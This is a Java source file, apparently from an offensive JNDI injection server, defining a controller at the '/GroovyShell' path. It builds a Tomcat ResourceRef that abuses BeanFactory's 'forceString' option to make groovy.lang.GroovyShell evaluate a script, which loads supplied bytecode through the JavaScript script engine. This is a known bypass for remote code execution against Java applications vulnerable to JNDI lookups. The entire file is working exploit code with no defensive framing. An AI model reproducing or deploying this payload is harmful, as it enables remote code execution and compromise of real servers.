package map.jndi.controller.bypass;

import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import map.jndi.controller.BasicController;
import map.jndi.payload.JavaScriptPayload;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

@JNDIController
@JNDIMapping("/GroovyShell")
public class GroovyShellController extends BasicController {
    @Override
    public Object process(byte[] byteCode) {
        System.out.println("[Reference] Factory: BeanFactory + GroovyShell");

        String code = JavaScriptPayload.loadClass(byteCode);
        String script = "Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + code + "\");";

        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=evaluate"));
        ref.add(new StringRefAddr("x", script));
        return ref;
    }
}
